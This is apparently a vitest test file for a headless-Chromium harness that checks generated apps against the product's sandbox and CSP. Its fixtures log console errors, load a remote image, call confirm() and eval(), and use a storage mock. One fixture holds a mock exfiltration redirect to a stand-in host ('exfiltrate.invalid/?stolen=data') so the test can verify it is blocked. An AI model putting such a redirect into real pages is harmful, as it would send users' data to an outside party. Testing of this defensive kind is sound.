// Real headless-Chromium checks for the App suite's browser pass (ruling 56).
// Unlike every other test in this harness, this one DOES launch a real
// browser — there is no faking a console error, a blocked network request or
// storage usage without actually running the page. Kept to a small number of
// cases (one browser launch each) given the cost.
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { chromium } from "playwright";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { evaluateApp } from "./browser-eval";

let outDir: string;

beforeEach(() => {
	outDir = mkdtempSync(join(tmpdir(), "browser-eval-test-"));
});

afterEach(() => {
	rmSync(outDir, { recursive: true, force: true });
});

describe("evaluateApp (ruling 56)", () => {
	it("captures a console error", async () => {
		const html = `<!doctype html><html><body>
<button id="go">Go</button>
<script>console.error("boom: something went wrong");</script>
</body></html>`;
		const browser = await chromium.launch();
		try {
			const result = await evaluateApp(browser, html, "console-error", outDir);
			expect(result.consoleErrors.some((e) => e.includes("boom"))).toBe(true);
		} finally {
			await browser.close();
		}
	}, 30_000);

	it("records a blocked network request (a remote image, refused by the real CSP itself)", async () => {
		const html = `<!doctype html><html><body>
<button id="go">Go</button>
<img src="https://example.invalid/should-be-blocked.png">
</body></html>`;
		const browser = await chromium.launch();
		try {
			const result = await evaluateApp(
				browser,
				html,
				"blocked-request",
				outDir,
			);
			// The product's real APP_SANDBOX_CSP (img-src data: blob:) refuses
			// this at the browser's OWN policy layer before it ever reaches this
			// harness's network-level route interceptor — reported as a console
			// error, exactly what a user's real browser would also log.
			expect(
				result.consoleErrors.some(
					(e) => /content security policy/i.test(e) && e.includes("img-src"),
				),
			).toBe(true);
		} finally {
			await browser.close();
		}
	}, 30_000);

	it("records a blocked network request (self-navigation, ruling 58's own data-leak concern)", async () => {
		// CSP has no directive that stops a document navigating ITSELF (unlike
		// fetch/image/script loads, all covered above) — an app leaking what it
		// holds by setting location.href is exactly what this harness's own
		// network-level block (never the product's, which relies on the
		// contract/audit refusing to generate this) has to catch.
		const html = `<!doctype html><html><body>
<button id="go">Go</button>
<script>location.href = "https://exfiltrate.invalid/?stolen=data";</script>
</body></html>`;
		const browser = await chromium.launch();
		try {
			const result = await evaluateApp(browser, html, "self-nav", outDir);
			expect(
				result.blockedRequests.some((url) =>
					url.includes("exfiltrate.invalid"),
				),
			).toBe(true);
		} finally {
			await browser.close();
		}
	}, 30_000);

	// Ruling 58: the browser pass now runs each App the way users get it — the
	// product's real sandbox attribute and CSP, not a bare top-level page. RV-2A's
	// own measurement (confirm() returns false, eval throws) is exactly what a
	// harness with no sandbox at all could never see, and scored 4 dead main
	// actions as "works". These two effects hold regardless of the forms-token
	// change landing on the parallel branch (no allow-modals in either value; the
	// CSP's script-src has never allowed 'unsafe-eval').
	it("confirm() is suppressed by the real sandbox (no allow-modals) rather than shown", async () => {
		const html = `<!doctype html><html><body>
<button id="go">Delete</button>
<script>
  document.getElementById('go').addEventListener('click', () => {
    if (confirm('Are you sure?')) { document.body.innerHTML = '<p>deleted</p>'; }
    else { document.body.innerHTML = '<p>cancelled (confirm returned false)</p>'; }
  });
</script>
</body></html>`;
		const browser = await chromium.launch();
		try {
			const result = await evaluateApp(browser, html, "confirm-dialog", outDir);
			// No real dialog is ever shown (the sandbox suppresses it), so
			// evaluateApp's own dialog handler never fires — but the click DID
			// run its handler, and confirm() resolved synchronously to false.
			expect(result.interaction.dialogs).toEqual([]);
			expect(result.interaction.clicked).toBe(true);
			expect(result.interaction.domChanged).toBe(true);
			expect(result.interaction.domChangedAfter).toBe("Delete");
		} finally {
			await browser.close();
		}
	}, 30_000);

	it("eval() throws under the real CSP (no 'unsafe-eval' in script-src)", async () => {
		const html = `<!doctype html><html><body>
<button id="go">Run</button>
<script>
  document.getElementById('go').addEventListener('click', () => {
    try {
      // biome-ignore lint/security/noGlobalEval: proving the product's own CSP blocks this
      eval('1 + 1');
      console.log('eval succeeded (should not happen under the real CSP)');
    } catch (e) {
      console.error('eval blocked: ' + e.message);
    }
  });
</script>
</body></html>`;
		const browser = await chromium.launch();
		try {
			const result = await evaluateApp(browser, html, "eval-blocked", outDir);
			expect(result.consoleErrors.some((e) => e.includes("eval blocked"))).toBe(
				true,
			);
		} finally {
			await browser.close();
		}
	}, 30_000);

	it("detects window.alfy.storage use, injected before the app's own script runs", async () => {
		const html = `<!doctype html><html><body>
<button id="go">Save</button>
<script>
  document.getElementById('go').addEventListener('click', () => {
    window.alfy.storage.set('count', 1);
  });
</script>
</body></html>`;
		const browser = await chromium.launch();
		try {
			const result = await evaluateApp(browser, html, "storage-use", outDir);
			// The smoke test clicks the one enabled button, which calls
			// alfy.storage.set — proving the bootstrap mock is present before the
			// app's own script runs (it references window.alfy on page load's
			// listener registration, which only works if the mock landed first).
			expect(result.storageSets).toBeGreaterThan(0);
			expect(result.storageKeys).toContain("count");
			expect(result.interaction.clicked).toBe(true);
		} finally {
			await browser.close();
		}
	}, 30_000);

	it("writes one screenshot per of the four page runs", async () => {
		const html = `<!doctype html><html><body><p>hello</p></body></html>`;
		const browser = await chromium.launch();
		try {
			const result = await evaluateApp(browser, html, "screenshots", outDir);
			expect(result.pages).toHaveLength(4);
			expect(result.pages.map((p) => p.label).sort()).toEqual(
				["dark-1280", "dark-390", "light-1280", "light-390"].sort(),
			);
			for (const page of result.pages) {
				expect(page.screenshot).toMatch(/^shot-screenshots-.*\.png$/);
			}
		} finally {
			await browser.close();
		}
	}, 30_000);
});
